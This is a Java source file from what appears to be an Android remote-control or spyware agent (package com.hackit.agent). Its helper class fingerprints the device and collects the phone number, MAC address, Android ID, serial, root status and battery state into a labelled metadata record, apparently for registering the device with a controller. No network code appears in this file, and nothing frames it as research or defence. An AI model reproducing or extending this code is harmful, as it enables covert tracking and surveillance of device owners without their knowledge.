package com.hackit.agent;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.security.MessageDigest;
import java.util.UUID;

/** Device identity, metadata, permission helpers and bounded stream reads. */
final class Common {
    private static final String PREFS = "svc";
    private static final int READ_CAP = 512 * 1024;

    static boolean granted(Context ctx, String permission) {
        return ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    static boolean grantedAny(Context ctx, String... permissions) {
        for (String permission : permissions) {
            if (granted(ctx, permission)) {
                return true;
            }
        }
        return false;
    }

    /** Stable per-install id: random UUID sealed to the install, not to the SIM. */
    static String sid(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String sid = prefs.getString("sid", null);
        if (sid == null) {
            sid = UUID.randomUUID().toString();
            prefs.edit().putString("sid", sid).apply();
        }
        return sid;
    }

    @SuppressWarnings("deprecation")
    static String androidId(Context ctx) {
        try {
            String id = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id == null ? "" : id;
        } catch (Throwable exc) {
            return "";
        }
    }

    static String hwidHash(Context ctx) {
        String seed = androidId(ctx) + Build.FINGERPRINT + Build.SERIAL + Common.sid(ctx);
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(seed.getBytes("UTF-8"));
            return Base64.encodeToString(digest, Base64.NO_WRAP);
        } catch (Exception exc) {
            return seed;
        }
    }

    static int battery(Context ctx) {
        try {
            BatteryManager manager = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            return manager == null ? 0 : manager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Throwable exc) {
            return 0;
        }
    }

    static boolean charging(Context ctx) {
        try {
            BatteryManager manager = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            return manager != null && manager.isCharging();
        } catch (Throwable exc) {
            return false;
        }
    }

    @SuppressWarnings("deprecation")
    static String phone(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= 26 && Common.granted(ctx, android.Manifest.permission.READ_PHONE_STATE)) {
                TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                String number = tm == null ? null : tm.getLine1Number();
                if (number != null && !number.isEmpty()) {
                    return number;
                }
            }
        } catch (Throwable ignored) {
        }
        return "";
    }

    static String abi() {
        String[] abis = Build.SUPPORTED_ABIS;
        return abis.length == 0 ? "" : abis[0];
    }

    static boolean rooted() {
        String[] paths = {
                "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
                "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
                "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su",
        };
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return Build.TAGS != null && Build.TAGS.contains("test-keys");
    }

    @SuppressWarnings("deprecation")
    static String mac(Context ctx) {
        try {
            WifiManager wifi = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifi == null) {
                return "";
            }
            String address = wifi.getConnectionInfo().getMacAddress();
            return address == null ? "" : address;
        } catch (Throwable exc) {
            return "";
        }
    }

    static JSONObject meta(Context ctx) {
        JSONObject meta = new JSONObject();
        try {
            Config config = Config.get(ctx);
            meta.put("label", config.label);
            meta.put("model", Build.MANUFACTURER + " " + Build.MODEL);
            meta.put("android", Build.VERSION.RELEASE == null ? "" : Build.VERSION.RELEASE);
            meta.put("sdk", Build.VERSION.SDK_INT);
            meta.put("abi", abi());
            meta.put("phone", phone(ctx));
            meta.put("battery", battery(ctx));
            meta.put("charging", charging(ctx) ? 1 : 0);
            meta.put("hwid", hwidHash(ctx));
            meta.put("rooted", rooted() ? 1 : 0);
            meta.put("mac", mac(ctx));
            meta.put("sid", sid(ctx));
        } catch (Exception exc) {
            Log.e("meta: " + exc);
        }
        return meta;
    }

    static String read(InputStream in) {
        return read(in, READ_CAP);
    }

    static String read(InputStream in, int cap) {
        if (in == null) {
            return "";
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream(Math.min(cap, 8192));
        byte[] buffer = new byte[8192];
        try {
            int read;
            while ((read = in.read(buffer)) > 0 && out.size() < cap) {
                out.write(buffer, 0, Math.min(read, cap - out.size()));
            }
            return out.toString("UTF-8");
        } catch (IOException exc) {
            return out.toString();
        }
    }

    static void closeQuietly(java.io.Closeable closeable) {
        if (closeable == null) {
            return;
        }
        try {
            closeable.close();
        } catch (IOException ignored) {
        }
    }

    /** org.json's JSONArray has no clear() below API 34. */
    static void clear(JSONArray array) {
        while (array.length() > 0) {
            array.remove(0);
        }
    }

    static String humanBytes(long bytes) {
        if (bytes < 1024) {
            return bytes + " B";
        }
        if (bytes < 1024L * 1024L) {
            return (bytes / 1024L) + " KB";
        }
        if (bytes < 1024L * 1024L * 1024L) {
            return String.format(java.util.Locale.US, "%.1f MB", bytes / 1048576.0);
        }
        return String.format(java.util.Locale.US, "%.2f GB", bytes / 1073741824.0);
    }

    private Common() {
    }
}
